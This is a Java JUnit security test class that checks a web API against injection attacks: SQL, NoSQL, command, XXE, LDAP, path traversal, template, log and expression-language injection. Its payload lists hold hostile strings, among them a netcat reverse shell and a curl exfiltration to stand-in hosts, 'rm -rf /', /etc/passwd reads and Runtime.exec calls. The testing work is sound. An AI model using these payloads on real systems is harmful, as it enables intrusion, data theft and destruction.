package greta.security;

import io.restassured.RestAssured;
import io.restassured.http.ContentType;
import org.junit.jupiter.api.*;

import java.util.Arrays;
import java.util.List;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.*;

/**
 * Security tests for injection attacks (SQL, NoSQL, Command, XXE, etc.)
 */
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
public class InjectionSecurityTest {
    
    private static final String BASE_URL = System.getProperty("greta.test.url", "http://localhost:8080");
    
    @BeforeAll
    public static void setup() {
        RestAssured.baseURI = BASE_URL;
    }
    
    @Test
    @Order(1)
    @DisplayName("Should prevent SQL injection attacks")
    public void testSQLInjection() {
        List<String> sqlInjectionPayloads = Arrays.asList(
            "' OR '1'='1",
            "'; DROP TABLE animations; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
            "1' AND '1'='1",
            "' UNION SELECT NULL, username, password FROM users--",
            "'; EXEC xp_cmdshell('dir'); --"
        );
        
        for (String payload : sqlInjectionPayloads) {
            // Test in search parameter
            given()
                .queryParam("search", payload)
            .when()
                .get("/api/animation/search")
            .then()
                .statusCode(anyOf(is(200), is(400)))
                .body(not(containsString("SQL")))
                .body(not(containsString("error in your SQL syntax")));
            
            // Test in JSON body
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "name": "%s",
                        "type": "gesture"
                    }
                    """, payload))
            .when()
                .post("/api/animation/create")
            .then()
                .statusCode(anyOf(is(200), is(201), is(400)))
                .body(not(containsString("SQL")))
                .body(not(containsString("syntax error")));
        }
    }
    
    @Test
    @Order(2)
    @DisplayName("Should prevent NoSQL injection attacks")
    public void testNoSQLInjection() {
        List<String> noSqlPayloads = Arrays.asList(
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$where\": \"this.password.length > 0\"}",
            "{\"$regex\": \".*\"}",
            "true, $where: '1 == 1'",
            "', $or: [ {}, { 'a':'a"
        );
        
        for (String payload : noSqlPayloads) {
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "query": %s
                    }
                    """, payload))
            .when()
                .post("/api/search/behaviors")
            .then()
                .statusCode(anyOf(is(200), is(400)))
                .body(not(containsString("$where")))
                .body(not(containsString("MongoError")));
        }
    }
    
    @Test
    @Order(3)
    @DisplayName("Should prevent command injection attacks")
    public void testCommandInjection() {
        List<String> commandPayloads = Arrays.asList(
            "; ls -la",
            "| cat /etc/passwd",
            "`rm -rf /`",
            "$(whoami)",
            "; nc -e /bin/bash attacker.com 4444",
            "& dir C:\\",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)"
        );
        
        for (String payload : commandPayloads) {
            // Test in filename parameter
            given()
                .queryParam("filename", "test" + payload + ".txt")
            .when()
                .post("/api/export/animation")
            .then()
                .statusCode(anyOf(is(200), is(400), is(403)))
                .body(not(containsString("root:")))
                .body(not(containsString("passwd")));
            
            // Test in process parameter
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "command": "convert",
                        "args": "%s"
                    }
                    """, payload))
            .when()
                .post("/api/process/execute")
            .then()
                .statusCode(anyOf(is(200), is(400), is(403)));
        }
    }
    
    @Test
    @Order(4)
    @DisplayName("Should prevent XXE (XML External Entity) attacks")
    public void testXXEAttacks() {
        String xxePayload = """
            <?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
                <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >
                <!ENTITY xxe2 SYSTEM "http://evil.com/steal" >
            ]>
            <animation>
                <name>&xxe;</name>
                <type>&xxe2;</type>
            </animation>
            """;
        
        given()
            .contentType(ContentType.XML)
            .body(xxePayload)
        .when()
            .post("/api/import/xml")
        .then()
            .statusCode(anyOf(is(400), is(415)))
            .body(not(containsString("root:")))
            .body(not(containsString("/etc/passwd")));
        
        // Test with parameter entities
        String parameterEntityPayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
                %eval;
                %error;
            ]>
            <animation>
                <name>test</name>
            </animation>
            """;
        
        given()
            .contentType(ContentType.XML)
            .body(parameterEntityPayload)
        .when()
            .post("/api/import/xml")
        .then()
            .statusCode(anyOf(is(400), is(415)));
    }
    
    @Test
    @Order(5)
    @DisplayName("Should prevent LDAP injection attacks")
    public void testLDAPInjection() {
        List<String> ldapPayloads = Arrays.asList(
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(mail=*))",
            ")(cn=*))(|(cn=*",
            "*()|(&(password=*",
            "admin))(|(password=*"
        );
        
        for (String payload : ldapPayloads) {
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "username": "%s",
                        "filter": "user"
                    }
                    """, payload))
            .when()
                .post("/api/ldap/search")
            .then()
                .statusCode(anyOf(is(200), is(400), is(403)))
                .body(not(containsString("LDAPException")))
                .body(not(containsString("malformed filter")));
        }
    }
    
    @Test
    @Order(6)
    @DisplayName("Should prevent path traversal attacks")
    public void testPathTraversal() {
        List<String> pathTraversalPayloads = Arrays.asList(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        );
        
        for (String payload : pathTraversalPayloads) {
            // Test file read endpoint
            given()
                .queryParam("file", payload)
            .when()
                .get("/api/resource/read")
            .then()
                .statusCode(anyOf(is(400), is(403), is(404)))
                .body(not(containsString("root:")))
                .body(not(containsString("passwd")));
            
            // Test file upload endpoint
            given()
                .multiPart("file", payload, "test content")
            .when()
                .post("/api/upload")
            .then()
                .statusCode(anyOf(is(400), is(403)));
        }
    }
    
    @Test
    @Order(7)
    @DisplayName("Should prevent template injection attacks")
    public void testTemplateInjection() {
        List<String> templatePayloads = Arrays.asList(
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "${{7*7}}",
            "#{7*7}",
            "*{7*7}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
            "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec(\"id\")}"
        );
        
        for (String payload : templatePayloads) {
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "template": "%s",
                        "data": {}
                    }
                    """, payload))
            .when()
                .post("/api/render/template")
            .then()
                .statusCode(anyOf(is(200), is(400)))
                .body(not(equalTo("49"))) // 7*7
                .body(not(containsString("uid=")))
                .body(not(containsString("java.lang.Runtime")));
        }
    }
    
    @Test
    @Order(8)
    @DisplayName("Should sanitize log injection attempts")
    public void testLogInjection() {
        List<String> logInjectionPayloads = Arrays.asList(
            "test\\r\\n[ERROR] Fake error message",
            "test%0d%0a[ERROR] Injected log entry",
            "test\\n2024-01-01 00:00:00 [CRITICAL] System compromised",
            "test\\r\\n\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<script>alert(1)</script>"
        );
        
        for (String payload : logInjectionPayloads) {
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "message": "%s",
                        "level": "info"
                    }
                    """, payload))
            .when()
                .post("/api/log/message")
            .then()
                .statusCode(anyOf(is(200), is(400)));
            
            // Verify logs don't contain injected content
            // This would need to be verified by checking actual log files
        }
    }
    
    @Test
    @Order(9)
    @DisplayName("Should prevent expression language injection")
    public void testExpressionLanguageInjection() {
        List<String> elPayloads = Arrays.asList(
            "${1+1}",
            "#{1+1}",
            "${applicationScope}",
            "${header['User-Agent']}",
            "${pageContext.request.getSession().setAttribute(\"admin\", true)}",
            "${{java.lang.System.exit(0)}}",
            "${java.lang.Runtime.getRuntime().exec(\"calc\")}"
        );
        
        for (String payload : elPayloads) {
            given()
                .contentType(ContentType.JSON)
                .body(String.format("""
                    {
                        "expression": "%s",
                        "context": {}
                    }
                    """, payload))
            .when()
                .post("/api/evaluate")
            .then()
                .statusCode(anyOf(is(200), is(400)))
                .body(not(equalTo("2"))) // Result of 1+1
                .body(not(containsString("java.lang")));
        }
    }
    
    @Test
    @Order(10)
    @DisplayName("Should validate and sanitize all input types")
    public void testInputValidation() {
        // Test oversized input
        String oversizedInput = "A".repeat(1000000); // 1MB of 'A's
        given()
            .contentType(ContentType.JSON)
            .body(String.format("""
                {
                    "data": "%s"
                }
                """, oversizedInput))
        .when()
            .post("/api/process/data")
        .then()
            .statusCode(anyOf(is(400), is(413)));
        
        // Test null bytes
        given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "filename": "test\\x00.txt"
                }
                """)
        .when()
            .post("/api/create/file")
        .then()
            .statusCode(400);
        
        // Test Unicode tricks
        given()
            .contentType(ContentType.JSON)
            .body("""
                {
                    "text": "test\\u202e\\u0000\\uffff"
                }
                """)
        .when()
            .post("/api/process/text")
        .then()
            .statusCode(anyOf(is(200), is(400)));
    }
}